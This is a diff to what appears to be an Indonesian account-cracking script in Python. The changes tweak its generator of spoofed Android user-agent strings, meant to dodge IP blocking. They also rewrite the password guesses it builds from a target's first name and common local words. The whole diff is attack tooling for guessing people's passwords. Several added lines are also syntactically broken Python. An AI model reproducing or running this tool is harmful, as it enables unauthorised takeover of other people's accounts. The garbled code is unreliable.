@@ -42,7 +42,7 @@ for agenku in range(10000):
 	ugen.append(uakuh)
 	
 for t in range(10000):
-	a='Mozilla/5.0 (Linux; Android; '
+	a='Mozilla/5.0 (Linux; Android;'
 	b=random.choice(['6.0.1','7.1.1','8.1.0'])
 	c='M2101K7BI Build/RP1A)'
 	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
@@ -54,7 +54,7 @@ for t in range(10000):
 	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 	ugen.append(uakuh)
 	
-	a='Mozilla/5.0 (Linux; Android; '
+	a='Mozilla/5.0 (Linux; Android;'
 	b=random.choice(['8','8.1.0','9','10','11'])
 	c='M2010J19CG Build/SKQ1)'
 	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
@@ -66,7 +66,7 @@ for t in range(10000):
 	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
 	ugen.append(uakuh)
 	
-	a='Mozilla/5.0 (Linux; Android; '
+	a='Mozilla/5.0 (Linux; Android;'
 	b=random.choice(['8','9','10','11','12'])
 	c='V2163A Build/RP1A)'
 	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ '
@@ -78,10 +78,10 @@ for t in range(10000):
 	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
 	ugen.append(uakuh)
 	
-	a='Mozilla/5.0 (Linux; Android; '
+	a='Mozilla/5.0 (Linux; Android;'
 	b=random.choice(['8','9','10','11','12'])
 	c='A1601 Build/LMY47I)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ '
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 	e=random.randrange(83,103)
 	f='0'
 	g=random.randrange(4200,4900)
@@ -549,39 +549,40 @@ AGAR TERHINDAR DARI SPAM IP
 						pass
 					else:
 						pwv.append(frs+'123')
+						pwv.append('frs+'1234')
+						pwv.append('frs+'12345')
+						pwv.append('frs+'123456')
+						pwv.append('frs+'gaming')
+						pwv.append('frs+'ganteng')
+						pwv.append('frs+'cantik')
+						pwv.append('Cililin')
+						pwv.append('Cililin123')
 						pwv.append('cililin')
 						pwv.append('cililin123')
-						pwv.append('cililin1234')
-						pwv.append('cililin12345')
-						pwv.append('bandung')
-						pwv.append('bandung123')
-						pwv.append('bandung1234')
-						pwv.append('bandung12345')
-						pwv.append('persib')
-						pwv.append('persib1933')
-						pwv.append('persib bandung')
-						pwv.append('persib123')
-						pwv.append('persib1234')
-						pwv.append('persib12345')
+						pwv.append('kamu nanya')
+						pwv.append('kata sandi')
+						pwv.append('kamunanya')
+						pwv.append('katasandi')
 				else:
 					if len(frs)<3:
 						pwv.append(nmf)
 					else:
 						pwv.append(nmf)
+						pwv.append(frs+'123')
+						pwv.append('frs+'1234')
+						pwv.append('frs+'12345')
+						pwv.append('frs+'123456')
+						pwv.append('frs+'gaming')
+						pwv.append('frs+'ganteng')
+						pwv.append('frs+'cantik')
+						pwv.append('Cililin')
+						pwv.append('Cililin123')
 						pwv.append('cililin')
 						pwv.append('cililin123')
-						pwv.append('cililin1234')
-						pwv.append('cililin12345')
-						pwv.append('bandung')
-						pwv.append('bandung123')
-						pwv.append('bandung1234')
-						pwv.append('bandung12345')
-						pwv.append('persib')
-						pwv.append('persib1933')
-						pwv.append('persib bandung')
-						pwv.append('persib123')
-						pwv.append('persib1234')
-						pwv.append('persib12345')
+						pwv.append('kamu nanya')
+						pwv.append('kata sandi')
+						pwv.append('kamunanya')
+						pwv.append('katasandi')
 				if 'ya' in pwt:
 					for xpwn in pwn:
 						pwv.append(xpwn)
